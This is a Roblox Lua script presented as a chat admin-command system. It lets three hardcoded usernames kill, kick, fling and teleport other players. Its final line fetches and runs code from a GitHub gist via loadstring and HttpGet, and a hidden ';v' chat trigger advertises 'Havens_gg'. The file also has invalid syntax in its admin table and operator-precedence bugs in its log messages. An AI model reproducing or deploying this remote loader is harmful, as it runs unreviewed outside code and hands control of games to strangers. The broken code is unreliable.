local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local RunService = game:GetService("RunService")

local AdminConfig = {
	.kit_cynALT = true,
	.BK_FAXBR = true,
	.nossikdksks = true
}

local function IsAdmin(player)
	return AdminConfig[player.Name] == true
end

local function FindPlayer(inputName)
	if not inputName then
		return nil
	end
	inputName = inputName:lower()
	for _, player in pairs(Players:GetPlayers()) do
		if inputName == player.Name:lower() or inputName == player.DisplayName:lower() then
			return player
		end
	end
	for _, player in pairs(Players:GetPlayers()) do
		if player.Name:lower():find(inputName) or player.DisplayName:lower():find(inputName) then
			return player
		end
	end
	local foundPlayer = nil
end

local function KillPlayer(player)
	if not player then
		return
	end
	local character = player.Character
	if not character then
		return
	end
	local humanoid = character:FindFirstChildOfClass("Humanoid")
	if humanoid then
		humanoid.Health = 0
	end
end

local function KickPlayer(player, reason)
	if not player then
		return
	end
	local success, err = pcall(function()
		player:Kick(reason or "Expulso pelo admin")
	end)
	if success then
		print("[KICK] Expulsou "..player.Name or "Desconhecido".." Motivo: "..tostring(reason ~= "" and reason or "Nenhum"))
	else
		warn("[KICK] Falha ao expulsar "..player.Name or "Desconhecido"..": "..tostring(err))
	end
end

local function SendChatMessage(message)
	if TextChatService.ChatInputBarConfiguration and TextChatService.ChatInputBarConfiguration.TargetTextChannel then
		local targetChannel = TextChatService.ChatInputBarConfiguration.TargetTextChannel
		targetChannel:SendAsync(message)
		print("✅ Mensagem enviada no chat: "..message)
	else
		warn("⚠️ Não foi possível encontrar o canal de chat geral.")
	end
end

local function BringPlayer(playerToBring, targetPlayer)
	if not playerToBring or not targetPlayer then
		return
	end
	local characterToBring = playerToBring.Character
	local targetCharacter = targetPlayer.Character
	if not characterToBring or not targetCharacter then
		return
	end
	local rootPartToBring = characterToBring:FindFirstChild("HumanoidRootPart") or characterToBring:FindFirstChild("Torso") or characterToBring:FindFirstChild("UpperTorso")
	local rootPartTarget = targetCharacter:FindFirstChild("HumanoidRootPart") or targetCharacter:FindFirstChild("Torso") or targetCharacter:FindFirstChild("UpperTorso")
	if not rootPartToBring or not rootPartTarget then
		return
	end
	local newPosition = rootPartToBring.Position + rootPartToBring.CFrame.LookVector * 2
	local newCFrame = CFrame.new(newPosition, newPosition + rootPartToBring.CFrame.LookVector)
	local success, err = pcall(function()
		rootPartTarget.CFrame = newCFrame
		if rootPartTarget:FindFirstChild("BodyVelocity") then
			rootPartTarget.BodyVelocity:Destroy()
		end
		if rootPartTarget:FindFirstChild("VectorForce") then
			rootPartTarget.VectorForce:Destroy()
		end
	end)
	if not success then
		warn("[BRING] falha ao trazer "..tostring(targetPlayer.Name)..": "..tostring(err))
	end
end

local function FlingPlayer(player, minForce, maxForce)
	if not minForce then
		minForce = 10
	end
	if not maxForce then
		maxForce = 50
	end
	if not player then
		return
	end
	local character = player.Character
	if not character then
		return
	end
	local rootPart = character:FindFirstChild("HumanoidRootPart") or character:FindFirstChild("Torso") or character:FindFirstChild("UpperTorso")
	if not rootPart then
		return
	end
	local randomX = math.random(-100, 100)
	local randomY = math.random(10, 80)
	local randomZ = math.random(-100, 100)
	local velocityVector = Vector3.new(randomX, randomY, randomZ)
	if velocityVector.Magnitude == 0 then
		velocityVector = Vector3.new(0, 50, 0)
	end
	velocityVector = velocityVector.Unit
	local randomForce = math.random(minForce, maxForce)
	local bodyVelocity = Instance.new("BodyVelocity")
	bodyVelocity.MaxForce = Vector3.new(1000000, 1000000, 1000000)
	bodyVelocity.Velocity = velocityVector * randomForce
	bodyVelocity.P = 1250
	bodyVelocity.Name = "TempFlingBV"
	bodyVelocity.Parent = rootPart
	local bodyAngularVelocity = Instance.new("BodyAngularVelocity")
	bodyAngularVelocity.MaxTorque = Vector3.new(1000000, 1000000, 1000000)
	bodyAngularVelocity.AngularVelocity = Vector3.new(math.random(-10, 10), math.random(-10, 10), math.random(-10, 10))
	bodyAngularVelocity.Name = "TempFlingBAV"
	bodyAngularVelocity.Parent = rootPart
	spawn(function()
		wait(0.5)
		if bodyVelocity and bodyVelocity.Parent then
			bodyVelocity:Destroy()
		end
		if bodyAngularVelocity and bodyAngularVelocity.Parent then
			bodyAngularVelocity:Destroy()
		end
	end)
end

local function ProcessCommand(player, message)
	if not IsAdmin(player) then
		return
	end
	local command, args = message:match("^%s*(;[%w_]+)%s*(.-)%s*$")
	if not command then
		return
	end
	command = command:lower()
	if command == ";kill" and args ~= "" then
		local targetPlayer = FindPlayer(args)
		if targetPlayer then
			KillPlayer(targetPlayer)
			print("[KILL] "..player.Name.." matou "..targetPlayer.Name)
		end
	else
		if command == ";kick" and args ~= "" then
			local playerName, reason = args:match("^(%S+)%s*(.-)%s*$")
			local targetPlayer = FindPlayer(playerName)
			if targetPlayer then
				KickPlayer(targetPlayer, reason ~= "" and reason or nil)
			end
		else
			if command == ";say" and args ~= "" then
				local _, messageContent = args:match("^(%S+)%s*(.-)%s*$")
				if messageContent == "" then
					messageContent = args
				end
				SendChatMessage(messageContent)
			else
				if command == ";bring" and args ~= "" then
					local targetPlayer = FindPlayer(args)
					if targetPlayer then
						BringPlayer(player, targetPlayer)
					end
				else
					if command == ";fling" and args ~= "" then
						local targetPlayer = FindPlayer(args)
						if targetPlayer then
							FlingPlayer(targetPlayer, 10, 50)
						end
					end
				end
			end
		end
	end
end

Players.PlayerAdded:Connect(function(player)
	player.Chatted:Connect(function(message)
		ProcessCommand(player, message)
	end)
end)

for _, player in pairs(Players:GetPlayers()) do
	player.Chatted:Connect(function(message)
		ProcessCommand(player, message)
	end)
end

TextChatService.MessageReceived:Connect(function(message)
	local senderName = not message.TextSource or message.TextSource.Name
	local messageText = message.Text
	if AdminConfig[senderName] and messageText == ";v" then
		task.wait(0.5)
		SendChatMessage("Havens_gg")
	end
end)

loadstring(game:HttpGet("https://gist.githubusercontent.com/Cat558-uz/07de0b7f84c7f6ce53b415814c6c7cb3/raw/9dac4ddb9ce08180e246195a188c0d81026cb668/gistfile1.txt"))()